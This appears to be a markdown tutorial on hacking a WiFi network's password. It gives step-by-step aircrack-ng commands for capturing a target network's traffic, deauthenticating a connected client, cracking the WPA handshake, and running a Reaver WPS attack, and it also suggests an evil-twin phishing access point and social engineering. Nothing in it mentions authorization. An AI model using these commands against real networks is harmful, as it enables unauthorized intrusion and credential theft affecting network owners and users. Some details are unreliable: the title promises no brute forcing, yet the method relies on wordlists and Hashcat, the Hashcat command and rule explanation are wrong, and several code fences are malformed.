# how to hack a wifi network and get its password without brute forcing?
## step 1: Understand the Basics
Before attempting to hack a WiFi network, it's essential to understand how WiFi security works.
open the terminal and type the following command to check your wireless interfaces:
```bash
iwconfig
```
This command will display a list of your wireless interfaces. Look for an interface that starts with "wlan" (e.g., wlan0, wlan1).

## step 2: Put Your Wireless Interface into Monitor Mode
- how to put your wireless interface into monitor mode:
```bash
sudo airmon-ng start wlan0
```
Replace `wlan0` with your wireless interface name. This command will create a new interface

## step 3: Capture WiFi Traffic
- how to capture WiFi traffic:
```bash
sudo airodump-ng wlan0mon
```
This command will display a list of nearby WiFi networks. Note the BSSID (MAC address) and channel (CH) of the target network you want to hack.

## step 4: Focus on the Target Network
- how to focus on the target network:
```bash
sudo airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0mon
```
Replace `<BSSID>` with the target network's BSSID and `<channel>` with its channel number. The `-w capture` option will save the captured packets to a file named "capture".

## step 5: Deauthenticate a Connected Client
- how to deauthenticate a connected client:
```bash
sudo aireplay-ng --deauth 10 -a <BSSID> -c <Client_MAC> wlan0mon
```
Replace `<BSSID>` with the target network's BSSID and `<Client_MAC>` with the MAC address of a connected client. This command will send deauthentication packets to the client, forcing it to reconnect and capture the handshake.

## step 6: Crack the WPA/WPA2 Handshake
- how to crack the WPA/WPA2 handshake:
```bash
sudo aircrack-ng -w /path/to/wordlist.txt -b <BSSID> capture-01.cap
```
Replace `/path/to/wordlist.txt` with the path to a wordlist file (a list of potential passwords) and `<BSSID>` with the target network's BSSID. The `capture-01.cap` is the file generated in step 4.

## alternative to step 6: cracking the handshake without using wordlist.txt
- to crack the WPA/WPA2 handshake without using a wordlist, you can use a tool like Hashcat or John the Ripper. These tools can perform brute-force attacks or use other techniques to guess the password.
- using Hashcat:
```bashhashcat -m 2500 capture.hccapx /path/to/rules.txt
```
Replace `capture.hccapx` with the converted handshake file and `/path/to/rules.txt` with the path to a rules file that defines how to modify potential passwords.

## example of rules.txt
```
# Example rules for Hashcat
# This rule set will try common variations of passwords
:
l l
u u
d d
s s
```
where l, u, d, and s represent lowercase, uppercase, digit, and special character transformations respectively.

## step 7: Analyze the Results
- After running the cracking tool, check the output for the recovered password. If successful, you will see the password displayed in the terminal.

## without using a wordlist or brute forcing
- If you want to hack a WiFi network without using a wordlist or brute forcing, you can try the following methods:
1. **WPS Attack**: If the target network has WPS (Wi-Fi Protected Setup) enabled, you can use tools like `Reaver` or `Bully` to exploit vulnerabilities in WPS and retrieve the password.
   ```bashsudo reaver -i wlan0mon -b <BSSID> -vv
   ```
   Replace `<BSSID>` with the target network's BSSID.
2. **Social Engineering**: Sometimes, the easiest way to get a WiFi password is to ask the network owner directly or use social engineering techniques to trick them into revealing it.
3. **Phishing**: Create a fake WiFi access point that mimics the target network and trick users into connecting to it. Once connected, you can capture their credentials.
4. **Exploiting Vulnerabilities**: Look for known vulnerabilities in the router's firmware or configuration that can be exploited to gain access to the network.

# installing airmon on arch linux:
## step 1: Update your system
```bashsudo pacman -Syu
```
## step 2: Install aircrack-ng package
```bashsudo pacman -S aircrack-ng
```
## step 3: Verify the installation
```bashairmon-ng --help
```
